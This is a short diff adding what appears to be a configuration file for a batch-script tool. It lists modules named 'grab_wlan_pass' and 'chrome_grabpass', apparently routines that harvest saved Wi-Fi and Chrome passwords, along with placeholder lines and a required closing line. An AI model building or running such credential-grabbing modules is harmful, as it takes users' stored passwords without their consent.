@@ -1,0 +1,6 @@
+grab_wlan_pass
+"Enter starting arguments here."
+chrome_grabpass
+"A line needs to have sth."
+A config always needs to end with a line with & exit /b & in it
+& exit /b &
